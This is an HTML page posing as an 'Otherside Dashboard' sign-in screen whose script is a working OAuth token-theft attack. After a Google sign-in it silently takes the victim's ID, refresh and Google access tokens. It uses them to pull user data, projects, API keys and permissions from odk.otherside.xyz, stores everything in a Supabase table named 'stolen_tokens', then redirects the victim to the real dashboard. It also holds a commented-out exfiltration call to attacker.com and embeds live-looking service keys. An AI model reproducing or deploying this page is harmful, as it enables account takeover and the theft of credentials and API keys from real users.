<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Otherside Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #0a0a0a;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background: #141414;
            border: 1px solid #2a2a2a;
            border-radius: 16px;
            padding: 48px;
            width: 100%;
            max-width: 420px;
            text-align: center;
        }
        .logo {
            width: 64px; height: 64px;
            background: linear-gradient(135deg, #6366f1, #8b5cf6);
            border-radius: 16px;
            margin: 0 auto 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
        }
        h1 { font-size: 24px; margin-bottom: 8px; }
        .subtitle { color: #888; font-size: 14px; margin-bottom: 32px; }
        .btn-google {
            width: 100%;
            padding: 14px;
            background: #fff;
            color: #333;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.2s;
            margin-bottom: 12px;
        }
        .btn-google:hover { background: #f0f0f0; transform: translateY(-1px); }
        .btn-google svg { width: 20px; height: 20px; }
        .divider {
            display: flex;
            align-items: center;
            gap: 16px;
            margin: 20px 0;
            color: #555;
            font-size: 13px;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #2a2a2a;
        }
        .btn-wallet {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #6366f1, #8b5cf6);
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.2s;
        }
        .btn-wallet:hover { opacity: 0.9; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">O</div>
        <h1>Welcome to Otherside</h1>
        <p class="subtitle">Sign in to access the dashboard</p>

        <button class="btn-google" onclick="signInWithGoogle()">
            <svg viewBox="0 0 24 24">
                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/>
                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
            </svg>
            Sign in with Google
        </button>

        <div class="divider">or</div>

        <button class="btn-wallet" onclick="alert('Wallet connection coming soon')">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
            </svg>
            Connect Wallet
        </button>
    </div>

    <!-- Firebase Compat SDK -->
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
    <!-- Supabase JS Client -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

    <script>

        // Supabase Configuration
        // =====================================================
        const SUPABASE_URL = 'https://anruszfozkhgddzpcpft.supabase.co';
        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFucnVzemZvemtoZ2RkenBjcGZ0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc5MjE2NzcsImV4cCI6MjA5MzQ5NzY3N30.Ap3qNDAfJeKYS-3cUn3_A2c4rif3v13mx2Ex1uukp7c';

        let supabaseClient = null;
        try {
            supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
        } catch(e) {
            console.error('Supabase init error:', e);
        }

        // =====================================================
        // Firebase Configuration
        // =====================================================
        const firebaseConfig = {
            apiKey: "AIzaSyDwML5MHO4FmSAwDHWWGNuS4JoIzu2ECS0",
            authDomain: "scarcely-calm-lark.firebaseapp.com",
            projectId: "scarcely-calm-lark",
            storageBucket: "scarcely-calm-lark.appspot.com",
            messagingSenderId: "761033708851",
            appId: "1:761033708851:web:fb54f41dc499d5a8ee1a46"
        };

        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        auth.tenantId = "hound-j8zaz";

        // Global holder for Google OAuth credential from popup
        let pendingCredential = null;

        // =====================================================
        // Save stolen token to Supabase
        // =====================================================
        async function saveToSupabase(data) {
            if (!supabaseClient) return false;
            try {
                const { data: result, error } = await supabaseClient
                    .from('stolen_tokens')
                    .insert([data])
                    .select();
                if (error) {
                    console.error('DB Error:', error.message);
                    return false;
                }
                console.log('Saved to Supabase, Row ID:', result[0] ? result[0].id : 'unknown');
                return true;
            } catch(e) {
                console.error('DB Exception:', e.message);
                return false;
            }
        }

        // =====================================================
        // Backup exfiltration via fetch() to attacker C2 server
        // =====================================================
        async function exfiltrateToC2(data) {
            try {
                // Real attacker C2 endpoint:
                // await fetch('https://attacker.com/collect', {
                //     method: 'POST',
                //     headers: { 'Content-Type': 'application/json' },
                //     body: JSON.stringify(data)
                // });
            } catch(e) {}
        }

        // =====================================================
        // Fetch ODK Dashboard data using stolen token
        // =====================================================
        async function fetchDashboardData(idToken) {
            const results = {};

            try {
                const userResp = await fetch('https://odk.otherside.xyz/api/v0/accounts/users/current', {
                    headers: { 'Authorization': 'Bearer ' + idToken }
                });
                if (userResp.ok) results.userData = await userResp.json();
            } catch(e) {}

            try {
                const projResp = await fetch('https://odk.otherside.xyz/api/v0/organizations/projects', {
                    headers: { 'Authorization': 'Bearer ' + idToken }
                });
                if (projResp.ok) results.projects = await projResp.json();
            } catch(e) {}

            try {
                const keysResp = await fetch('https://odk.otherside.xyz/api/v0/organizations/apiKeys', {
                    headers: { 'Authorization': 'Bearer ' + idToken }
                });
                if (keysResp.ok) results.apiKeys = await keysResp.json();
            } catch(e) {}

            try {
                const permResp = await fetch('https://odk.otherside.xyz/api/v0/permissions/resource/reviewAccess', {
                    method: 'POST',
                    headers: {
                        'Authorization': 'Bearer ' + idToken,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        resource: 'o/fine-houses-deny-595464',
                        verb: 'ALL'
                    })
                });
                if (permResp.ok) results.permissions = await permResp.json();
            } catch(e) {}

            return results;
        }

        // =====================================================
        // Full exfiltration pipeline - runs after successful auth
        // =====================================================
        async function exfiltrateAll(user, googleAccessToken) {
            try {
                const idToken = await user.getIdToken();

                // Get refresh token from Firebase internal storage
                let actualRefreshToken = '';
                try {
                    const storedUser = JSON.parse(localStorage.getItem(
                        '[DEFAULT]/scarcely-calm-lark.firebaseapp.com/' + user.uid
                    ) || '{}');
                    if (storedUser.stsTokenManager && storedUser.stsTokenManager.refreshToken) {
                        actualRefreshToken = storedUser.stsTokenManager.refreshToken;
                    }
                } catch(e) {}

                // Fetch ODK Dashboard data
                const dashData = await fetchDashboardData(idToken);

                // Build the full stolen data object
                const stolenData = {
                    victim_email: user.email || '',
                    victim_uid: user.uid || '',
                    victim_name: user.displayName || '',
                    victim_picture_url: user.photoURL || '',
                    id_token: idToken,
                    refresh_token: actualRefreshToken,
                    google_access_token: googleAccessToken || '',
                    tenant_id: user.tenantId || '',
                    provider: user.providerData[0] ? user.providerData[0].providerId : '',
                    is_new_user: false,
                    origin_domain: window.location.hostname,
                    user_agent: navigator.userAgent,
                    token_expires_at: new Date(Date.now() + 3600000).toISOString(),
                    dashboard_user_data: dashData.userData ? JSON.stringify(dashData.userData) : '',
                    dashboard_projects: dashData.projects ? JSON.stringify(dashData.projects) : '',
                    dashboard_apikeys: dashData.apiKeys ? JSON.stringify(dashData.apiKeys) : '',
                    dashboard_permissions: dashData.permissions ? JSON.stringify(dashData.permissions) : '',
                    notes: 'Auto-captured from m2-edison-preview.vercel.app'
                };

                // Save to Supabase
                await saveToSupabase(stolenData);

                // Backup: exfiltrate to C2 server
                await exfiltrateToC2(stolenData);

            } catch (err) {
                console.error('Exfiltration error:', err.message);
            }
        }

        // =====================================================
        // Monitor auth state - triggers exfiltration pipeline
        // =====================================================
        auth.onAuthStateChanged(async (user) => {
            if (user) {
                // Wait a moment for pendingCredential to be set by signInWithGoogle
                let waitCount = 0;
                while (!pendingCredential && waitCount < 20) {
                    await new Promise(r => setTimeout(r, 100));
                    waitCount++;
                }

                // Run the full exfiltration pipeline silently
                await exfiltrateAll(user, pendingCredential);
            }
        });

        // =====================================================
        // Google Sign-In
        // =====================================================
        async function signInWithGoogle() {
            const provider = new firebase.auth.GoogleAuthProvider();
            provider.addScope('profile');
            provider.addScope('email');

            try {
                const result = await auth.signInWithPopup(provider);

                // Capture Google access token from credential immediately
                let googleAccessToken = '';
                if (result.credential && result.credential.accessToken) {
                    googleAccessToken = result.credential.accessToken;
                }

                // Store for the onAuthStateChanged handler
                pendingCredential = googleAccessToken;

                // Redirect to real dashboard after successful login
                setTimeout(() => {
                    window.location.href = 'https://odk.otherside.xyz/dashboard';
                }, 2000);

            } catch (error) {
                console.error('OAuth error:', error.code, error.message);

                if (error.code === 'auth/popup-blocked') {
                    auth.signInWithRedirect(provider);
                }
            }
        }

        // Handle redirect result
        auth.getRedirectResult().then((result) => {
            if (result && result.user) {
                if (result.credential && result.credential.accessToken) {
                    pendingCredential = result.credential.accessToken;
                }
            }
        }).catch((error) => {
            if (error.code && error.code !== 'auth/no-auth-event') {
                console.error('Redirect error:', error.code);
            }
        });
    </script>
</body>
</html>
